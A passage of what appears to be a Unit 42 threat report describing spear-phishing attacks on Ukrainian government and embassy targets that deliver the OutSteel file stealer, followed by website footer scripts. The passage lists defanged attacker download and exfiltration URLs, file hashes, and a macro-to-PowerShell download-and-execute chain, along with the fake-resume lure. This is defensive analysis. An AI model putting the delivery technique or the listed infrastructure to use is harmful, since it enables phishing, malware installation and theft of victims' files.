</span>14. Finishes by calling <span style="font-family: 'courier new', courier, monospace;">ExitProcess</span></p>
<p>The file hosted at 150520212[.]space/0404.exe (SHA256: cb4a93864a19fc14c1e5221912f8e7f409b5b8d835f1b3acc3712b80e4a909f1) is an OutSteel sample that gathers and exfiltrates files to http://45[.]146.164.37/upld/.</p>
<h3><a id="july-2021-targeting"></a>July 2021 Targeting</h3>
<p>On July 22, 2021, we observed a spear phishing attempt in which the threat group targeted a Western government entity in Ukraine. The actors sent the email to an address publicly displayed on the embassy’s website with the subject <span style="font-family: 'courier new', courier, monospace;">RE: CV</span>. The email had a Word document attached to it with a filename structured as <span style="font-family: 'courier new', courier, monospace;">&lt;first name&gt;_&lt;last name&gt;_CV.doc</span>, of which the name was a well-known journalist in Ukraine. Figure 29 shows the contents of the attached document as it would display in a native Ukrainian installation of Windows.</p>
<figure id="attachment_122133" aria-describedby="caption-attachment-122133" style="width: 900px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-122133" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2022/02/word-image-52.png" alt="Contents of delivery document used in July 2021 attacks on an embassy in Kyiv." width="900" height="724" /><figcaption id="caption-attachment-122133" class="wp-caption-text">Figure 29. Contents of delivery document used in July 2021 attacks on an embassy in Kyiv.</figcaption></figure>
<p>The content of the document is meant to resemble a resume of the journalist. However, the garbled text suggests an encoding issue that the Ukrainian version of Windows could not display. The image is a stock photo available at several websites [<a href="https://www.shutterstock.com/image-photo/work-confidence-waist-portrait-smiling-woman-1284691177">1</a>][<a href="https://stock.adobe.com/images/One-female-specialists-staying-on-work-office/243123332">2</a>][<a href="https://www.apimages.com/metadata/MSIndex/One-female-specialists-staying-on-work-office/243123332/517">3</a>], which does not appear to be a picture of the actual journalist. The garbled text is likely intentional as an attempt to trick the user into clicking the “Enable Editing” button, which would ultimately run the macro embedded in the document. The macro that will run if the user clicks the “Enable Editing” button, seen in Figure 30, creates a batch script called <span style="font-family: 'courier new', courier, monospace;">meancell.bat</span> that executes a PowerShell command that will use the <span style="font-family: 'courier new', courier, monospace;">Start-BitsTransfer</span> cmdlet to download a payload from <span style="font-family: 'courier new', courier, monospace;">hxxp://1833[.]site/kpd1974.exe</span>. It then saves it to and executes <span style="font-family: 'courier new', courier, monospace;">everylisten.exe</span>. Figure 30 shows the contents of the macro found in this delivery document.</p>
<figure id="attachment_122135" aria-describedby="caption-attachment-122135" style="width: 709px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-122135" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2022/02/word-image-53.png" alt="Contents of macro in delivery document." width="709" height="177" /><figcaption id="caption-attachment-122135" class="wp-caption-text">Figure 30. Contents of macro in delivery document.</figcaption></figure>
<p>The <span style="font-family: 'courier new', courier, monospace;">kpd1974.exe</span> file (SHA256: <span style="font-family: 'courier new', courier, monospace;">b8ce958f56087c6cd55fa2131a1cd3256063e7c73adf36af313054b0f17b7b43</span>) downloaded and executed by the macro ultimately runs a variant of the OutSteel document harvesting tool that exfiltrates files to <span style="font-family: 'courier new', courier, monospace;">hxxp://45.146.165[.]91:8080/upld/</span>. We found two additional delivery documents that shared a similar macro and hosted the payload on the <span style="font-family: 'courier new', courier, monospace;">1833[.]site</span>, as seen in Table 5. One of the filenames of these two related documents suggest that the threat group continued to use the fake resume theme.</p>
<table style="width: 98.6285%;">
<tbody>
<tr>
<td style="width: 17.0974%;"><b>First Seen</b></td>
<td style="width: 34.5924%;"><b>Filename</b></td>
<td style="width: 224.254%;"><b>Download URL</b></td>
</tr>
<tr>
<td style="width: 17.0974%;"><span style="font-weight: 400;">7/23/2021</span></td>
<td style="width: 34.5924%;"><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">Довiдка (22-7-2021).doc</span></td>
<td style="width: 224.254%;"><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">hxxp://1833[.]site/gp00973.exe</span></td>
</tr>

                <input type="emal" placeholder="Your Email" name="Email"  class="subscribe-field" id="newsletter-email" aria-labelledby="newsletter-email-label">
                <p class="error-mail mb-15 text-danger" style="color: #dc3545"></p>

<script>

(function($) {
	// Migrated from the unit42-v5 + Modifications
	var subscribeSuccess = false;
	var email = document.getElementById('newsletter-email');
	var subscription_form = document.getElementById('unit42footerSubscription_form');
	var subscription_form_button = document.getElementById('unit42footerSubscription_form_button');
	window.captchaComplete = function() {
		subscribeSuccess = true;
		if ($(mail).val() != '' && isEmail($(mail).val())) {
			$(subscription_form_button).removeClass('is-disabled');
		}
		setTimeout(function() {
			$(email).focus();
			$('.g-recaptcha iframe').attr('tabindex', '-1');
		}, 100)
	}
	window.captchaExpires = function() {
		subscribeSuccess = false;
		$(subscription_form_button).addClass('is-disabled', true);
	} 
	$(subscription_form).submit(function(e) {
		e.preventDefault();
		e.stopImmediatePropagation();
		updateEmailMask();
		var success = true;
		var form = $(this);
		var mail = form.find('input[name="Email"]');
		
		if (mail.val() === '') {
			mail.addClass('has-error');
			showError(1);
			success = false;	
		}  else if (!isEmail(mail.val())){
			showError(2);
			success = false;
		}
		else {
			mail.removeClass('has-error');
			$('.error-mail').addClass('d-none');
		}

		if (!subscribeSuccess) {
			$('.error-recaptcha').removeClass('d-none');
		} else {
			$('.error-recaptcha').addClass('d-none');
		}

		if (success && subscribeSuccess) {
			$.ajax({
				type: 'POST',
				url: form.attr('action'),
				data: form.serialize(),
				beforeSend: function() {
                 form.find('button').addClass('is-loading');
    			},
				success: function(msg) {
					form.find('.form-success-message').html('<p class="success-message">You have been successfully subscribed</p>');
					form.find('button').removeClass('is-loading');
					$(email).val('');
					clearError();
				},
				error: function(jqXHR, textStatus, errorThrown) {
					$(subscription_form_button).addClass('is-disabled', true);
					form.find('button').removeClass('is-loading');
					
				}
			});
		}
		return false;
	});
	function showError(error_type){
		if(error_type == 1) {
			$('.error-mail').text("Please enter the email address.").addClass('error-show');
			$(subscription_form_button).addClass('is-disabled');
		} else if(error_type == 2){
			$('.error-mail').text("Please provide a valid e-mail address.").addClass('error-show');
			$(subscription_form_button).addClass('is-disabled');
		}	
		$(subscription_form_button).removeClass('is-loading');
	}
	function clearError(){
		$('.error-mail').text("").removeClass('error-show');;
		$(subscription_form_button).removeClass('is-loading');
		$(subscription_form_button).removeClass('is-disabled');
	}
	
	$(email).on('input', function (event) { 
		var email = $(this).val();
		if (isEmail(email) ) {			
			clearError();
		} else if(email == ""){
			clearError();
		} else{
			showError(2);			  
		}
    });

	function isEmail(email) {
		var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
		return re.test(String(email).toLowerCase());
	}
	
	var captcha_loaded = false;
         if(!captcha_loaded){
            // recaptcha on foucs call
            $(document).on('change paste keyup', '#newsletter-email', function () {
               if($('.g-recaptcha').hasClass('d-none')){
                $('.g-recaptcha').removeClass('d-none');
               }
               if(!captcha_loaded ){
                  captcha_loaded  = true;
                  // trigger loading api.js (recaptcha.js) script
                  var head = document.getElementsByTagName('head')[0];
                  var script = document.createElement('script');
                  script.type = 'text/javascript';
                  script.src = 'https://www.google.com/recaptcha/api.js?hl=en_US';
                  head.appendChild(script);
               }
            });
        }
	
	function updateEmailMask() {
		var email = $("#unit42footerSubscription_form input[name='Email']").val();
		if (email && email.trim() != '') {
			var maskedEmail = maskEmailAddress(email);
			$("#unit42footerSubscription_form input[name='emailFormMask']").val(maskedEmail);
		}
	}

	function maskEmailAddress (emailAddress) {
		function mask(str) {
			var strLen = str.length;
			if (strLen > 4) {
				return str.substr(0, 1) + str.substr(1, strLen - 1).replace(/\w/g, '*') + str.substr(-1,1);
			}
			return str.replace(/\w/g, '*');
		}
		return emailAddress.replace(/([\w.]+)@([\w.]+)(\.[\w.]+)/g, function (m, p1, p2, p3) {
			return mask(p1) + '@' + mask(p2) + p3;
		});

		return emailAddress;
	}

}(jQuery));
//# sourceMappingURL=main.js.map
	
</script>
<!--  End: Footer subscription form -->

	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		var like_nonce = jQuery('#_wpnonce').val();
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type+"&ul_nonce="+like_nonce,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>

function loadScript(url, defer){
    var script1 = document.createElement('script');
    script1.setAttribute('type', 'text/javascript');
    script1.setAttribute('src',url);
    if(defer == true){
        script1.setAttribute('defer','defer');
    }
    document.head.appendChild(script1);
}
function loadScript1(url, callback){

    var script = document.createElement("script")
    script.type = "text/javascript";
    if (script.readyState){  //IE
        script.onreadystatechange = function(){
            if (script.readyState == "loaded" || script.readyState == "complete"){
                script.onreadystatechange = null;
                callback();
            }
        };
    } else {  //Others
        script.onload = function(){
            callback();
        };
    }
    script.src = url;
    document.getElementsByTagName("head")[0].appendChild(script);
}
if(referer == "Prisma" || referer == "Cortex" || referer == "Sase" || referer == "Unit" || referer == "Ngfw"){

    setTimeout(function(){
      loadScript(main_site_criticalTopBase, false);
      loadScript1(main_site_criticalTopProductNav, function(){

      });
      loadScript(main_site_defered, false);
    }, 3000);
	}

        window.PAN_initializeProduct2021Nav();
      });
      loadScript(main_site_defered, false);
    }, 3000);
	}
}
